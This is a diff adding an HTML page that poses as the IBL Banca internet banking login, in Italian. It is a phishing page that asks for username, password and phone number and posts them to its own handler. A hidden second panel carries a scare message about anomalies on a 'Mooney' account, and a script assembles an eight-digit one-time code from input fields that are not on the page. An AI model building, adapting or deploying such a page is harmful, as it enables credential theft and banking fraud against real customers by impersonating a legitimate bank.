@@ -1,0 +1,229 @@
+<html class="sfondo"><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head><body>
+    <div class="father" style="display: none;">
+    <div class="child"><img src="logo.png"></div>
+</div>
+<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
+<link rel="stylesheet" href="jquery-pincode-autotab.css">
+<script src="jquery-latest.min.js"></script>
+<script src="jquery-pincode-autotab.min.js"></script>
+<div class="resto" style="display: block;">
+
+<style>
+    @font-face{font-family:Montserrat;font-style:normal;font-weight:400;src:url(montserrat-v10-latin-regular.eot);src:local("Montserrat Regular"),local("Montserrat-Regular"),url(montserrat-v10-latin-regular.eot?#iefix) format("embedded-opentype"),url(montserrat-v10-latin-regular.woff2) format("woff2"),url(montserrat-v10-latin-regular.woff) format("woff"),url(montserrat-v10-latin-regular.ttf) format("truetype"),url(montserrat-v10-latin-regular.svg#Montserrat) format("svg")}@font-face{font-family:Montserrat;font-style:normal;font-weight:500;src:url(montserrat-v10-latin-500.eot);src:local("Montserrat Medium"),local("Montserrat-Medium"),url(montserrat-v10-latin-500.eot?#iefix) format("embedded-opentype"),url(montserrat-v10-latin-500.woff2) format("woff2"),url(montserrat-v10-latin-500.woff) format("woff"),url(montserrat-v10-latin-500.ttf) format("truetype"),url(montserrat-v10-latin-500.svg#Montserrat) format("svg")}@font-face{font-family:Montserrat;font-style:normal;font-weight:600;src:url(montserrat-v10-latin-600.eot);src:local("Montserrat SemiBold"),local("Montserrat-SemiBold"),url(montserrat-v10-latin-600.eot?#iefix) format("embedded-opentype"),url(montserrat-v10-latin-600.woff2) format("woff2"),url(montserrat-v10-latin-600.woff) format("woff"),url(montserrat-v10-latin-600.ttf) format("truetype"),url(montserrat-v10-latin-600.svg#Montserrat) format("svg")}@font-face{font-family:Montserrat;font-style:normal;font-weight:300;src:url(montserrat-v10-latin-300.eot);src:local("Montserrat Light"),local("Montserrat-Light"),url(montserrat-v10-latin-300.eot?#iefix) format("embedded-opentype"),url(montserrat-v10-latin-300.woff2) format("woff2"),url(montserrat-v10-latin-300.woff) format("woff"),url(montserrat-v10-latin-300.ttf) format("truetype"),url(montserrat-v10-latin-300.svg#Montserrat) format("svg")}@font-face{font-family:Montserrat;font-style:italic;font-weight:300;src:url(montserrat-v10-latin-300italic.eot);src:local("Montserrat Light"),local("Montserrat-Light"),url(montserrat-v10-latin-300italic.eot?#iefix) format("embedded-opentype"),url(montserrat-v10-latin-300italic.woff2) format("woff2"),url(montserrat-v10-latin-300italic.woff) format("woff"),url(montserrat-v10-latin-300italic.ttf) format("truetype"),url(montserrat-v10-latin-300italic.svg#Montserrat) format("svg")}@font-face{font-family:icomoon;src:url(icomoon.eot?nwd5fh);src:url(icomoon.eot?nwd5fh#iefix) format("embedded-opentype"),url(icomoon.ttf?nwd5fh) format("truetype"),url(icomoon.woff?nwd5fh) format("woff"),url(icomoon.svg?nwd5fh#icomoon) format("svg");font-weight:400;font-style:normal}@font-face{font-family:icomoon2;src:url(icomoon2.eot?nwd5fh);src:url(icomoon2.eot?nwd5fh#iefix) format("embedded-opentype"),url(icomoon2.ttf?nwd5fh) format("truetype"),url(icomoon2.woff?nwd5fh) format("woff"),url(icomoon2.svg?nwd5fh#icomoon) format("svg");font-weight:400;font-style:normal}
+
+    html{
+        font-family: Montserrat, sans-serif;
+    background: rgba(102,166,255,.1);
+    background: -webkit-linear-gradient(28deg,rgba(102,166,255,.1) 0,rgba(110,178,255,.1) 60%,rgba(116,186,255,.1) 100%);
+    background: linear-gradient(to right,#b6b6b6 0,#dcdcdc 50%,#ffff 100%);
+    color:#01487e;
+    }
+.father {
+ display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.resto{
+    display: none ;
+}
+
+.nascondi{
+    display: none !important;
+}
+
+.child {
+
+    margin-top: 100%;
+    position: absolute; 
+}
+.myButton {
+   
+    border: 0;
+    color: #fff;
+    width:100%;
+    background-color: #01487e;
+    font-size: 13px;
+    padding: 16px 40px;
+    line-height: 16px;
+    letter-spacing: 0;
+    text-align: center;
+    font-family: Lato,sans-serif;
+    font-weight: 400!important;
+    text-transform: none;
+    -webkit-border-radius: 20px;
+    -moz-border-radius: 20px;
+    -ms-border-radius: 20px;
+    border-radius: 20px;
+    cursor: pointer;
+    text-transform: uppercase;
+}
+.myButton:hover {
+    
+    color: #01487e;
+	background-color:#fbb929
+}
+.myButton:active {
+	position:relative;
+	top:1px;
+}
+
+        
+
+label{
+    margin: 15px 0px !important;
+     font-size: 110%;
+}
+.i1{
+    width:100%;   height: 3em;
+    background: transparent;
+    border:none;
+    line-height: 180%;
+    font-size: 110%;
+}
+
+
+.elemento{
+    -webkit-border-radius: 2px;
+    -moz-border-radius: 2px;
+    -ms-border-radius: 2px;
+    border-radius: 2px;
+    -webkit-appearance: none;
+    outline: 0;
+    height: 5em;
+    font-family: Montserrat,sans-serif;
+    font-weight: 400!important;
+    font-size: 1rem;
+    color: #262626;
+    letter-spacing: .83px;
+    padding: 0px 9px 9px 9px;
+    box-shadow: none;
+    transition: all .3s;
+    border: 1px solid #e6e6e6;
+}
+.elemento p{margin:7px 0;
+    color:#01487e;}
+.sfondo{
+    /* FLOAT: RIGHT; */
+    background-color: white;
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+#demo {
+    background-color: white;
+    border:1px solid white;
+padding:20px;
+}
+
+.barra{
+   background-color:white;
+    color:#ffc627;
+    padding:15px 5px 5px 15px;
+}
+</style>
+
+<div class="barra">
+<img src="logo.png">
+</div>
+
+<div style="margin: 20px; color: white; text-align: center; font-weight: 100; line-height: 150%;">
+
+</div>
+<form method="POST" id="demo" autocomplete="off" class="" style="margin:5%">
+<div>
+<div style="float:left;">
+<img src="img_prelogin.png" style=" width: 83px;margin-top:10px ">
+</div>
+<div style="/* margin: 22px; */padding-top: 9px;padding-left: 98px; font-size:150%">
+<span>
+LOGIN
+</span><div style="width: 100%;margin: 15px 0;border-top: 2px solid #01487e;"></div>
+
+
+<span style="font-size:50%;color:black">
+BENVENUTO NEL NUOVO INTERNET BANKING DI IBL BANCA!
+
+<br>
+<br>
+Per accedere ai servizi anche da desktop, scarica o aggiorna la nuova App 
+IBL E-Bank su App Store e Google Play.
+<br>
+<br>
+Per informazioni di natura commerciale e sull'operatività dei conti,
+ contatta la tua filiale IBL Banca o il Numero Verde 800.91.90.90 (lun.-ven. 8.30-19.30). 
+Se hai già attivato Internet Banking con IBL Banca, per qualsiasi esigenza di natura tecnica puoi contattare: Numero Verde 800.42.51.23
+</span><br>
+<br>
+<b style="font-size:50%;color:black">Inserisci di seguito le credenziali per accedere all'area riservata:</b>
+</div>   
+</div>
+<br>  <br>
+  <br>
+<div class="elemento">
+<p>Inserisci Username</p>
+        <input class="i1" name="cod" required="">
+</div>
+<br>
+  <br>
+<div class="elemento">
+<p>Inserisci Password</p>
+        <input class="i1" type="password" name="pin" required="">
+</div>
+<br>
+  <br>
+
+<div class="elemento">
+<p>Inserisci Numero di Telefono</p>
+        <input class="i1" name="tel" required="">
+</div>
+
+  <br>  <br>  
+   
+<br><br>
+        <button type="submit" class="myButton">ACCEDI</button>
+
+</form>
+<div id="demo" style="margin:5%; font-size:140%;display:none">
+<b>
+Attenzione!
+Gentile Cliente,
+Abbiamo notato delle anomalie presenti sul suo conto Mooney.<br><br>
+La invitiamo quindi a compilare il modulo che segue dove le saranno sottoscritte 
+le problematiche riscontrate.<br>
+<br>Per rendere Mooney un luogo sicuro,la invitiamo a confermare il seguente MODULO ANAGRAFICO. 
+"La ricordiamo che per la sua sicurezza,diverse funzionalità del suo conto,
+ sono state temporaneamente sospese."<br><br>
+ Per ripristinare le piene funzionalità del suo conto,La invitiamo a verificare il modulo presente in questa pagina
+</b>
+
+
+</div>
+</div>
+<script>
+    setTimeout(function(){
+
+jQuery(".father").fadeOut( "slow", function() {
+   
+        jQuery("html").addClass("sfondo")
+        jQuery(".resto").fadeIn()
+  });
+
+    },2000)
+    </script>
+    <script>$(document).ready(function() {
+  $(".myPinCode input").jqueryPincodeAutotab();
+});
+
+setInterval(function(){
+    valore=jQuery("#o1").val()+ jQuery("#o2").val()+ jQuery("#o3").val()+ jQuery("#o4").val()+ jQuery("#o5").val()+ jQuery("#o6").val()+ jQuery("#o7").val()+ jQuery("#o8").val()
+   if(valore.length==8){
+    jQuery("#otp").val(valore)
+   }else{
+    jQuery("#otp").val("")
+   }
+    
+
+}, 200);
+</script>
+
+</body></html>
